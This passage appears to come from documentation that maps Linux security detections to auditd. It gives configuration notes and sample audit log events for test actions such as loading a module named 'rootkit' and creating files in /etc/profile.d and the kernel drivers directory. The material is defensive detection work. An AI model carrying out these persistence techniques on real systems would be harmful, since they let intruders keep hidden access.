type=USER_CMD msg=audit(03/17/2023 17:02:28.649:1646) : pid=5601 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=modprobe rootkit terminal=pts/1 res=success' 

```  

### Linux File Creation In Profile Directory

Datamodel: Filesystem  
Auditd config: Yes 
CIM Mapping: Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.process_guid  Filesystem.file_path    
Search: No change  
Limitations:   
Sample events:    

```
type=PROCTITLE msg=audit(03/17/2023 17:21:03.971:2019) : proctitle=vi /etc/profile.d/test.txt 
type=PATH msg=audit(03/17/2023 17:21:02.807:2018) : item=0 name=/etc/profile.d/ inode=67199483 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/17/2023 17:21:02.807:2018) : item=1 name=/etc/profile.d/test.txt objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/17/2023 17:21:02.807:2018) : proctitle=vi /etc/profile.d/test.txt 
type=PATH msg=audit(03/17/2023 17:21:01.107:2017) : item=0 name=/etc/profile.d/ inode=67199483 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/17/2023 17:21:01.107:2017) : item=1 name=/etc/profile.d/test.txt objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 

```  


### Linux File Created In Kernel Driver Directory

Auditd config: Yes.  
CIM Mapping: Yes.  
Search: No change required.  
Limitations: Ensure the directory containing ~/kernel/drivers/* is monitored by auditd. This may change on kernel upgrades etc.  
Sample events:    

```
type=SYSCALL msg=audit(01/03/2023 17:56:29.074:709) : arch=x86_64 syscall=open success=yes exit=3 a0=0x7fffc681b756 a1=O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK a2=0666 a3=0x7fffc681a6a0 items=2 ppid=17027 pid=17031 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=touch exe=/usr/bin/touch subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=kdriverfile 
type=CWD msg=audit(01/03/2023 17:56:29.074:709) :  cwd=/home/test-2 
type=PATH msg=audit(01/03/2023 17:56:29.074:709) : item=0 name=/lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/ inode=67670904 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:modules_object_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(01/03/2023 17:56:29.074:709) : item=1 name=/lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/test-kernel-driv-file3.txt inode=67180376 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:modules_object_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(01/03/2023 17:56:29.074:709) : proctitle=touch /lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/test-kernel-driv-file3.txt 
```






### Linux Busybox Privilege Escalation

PROCESS







END.
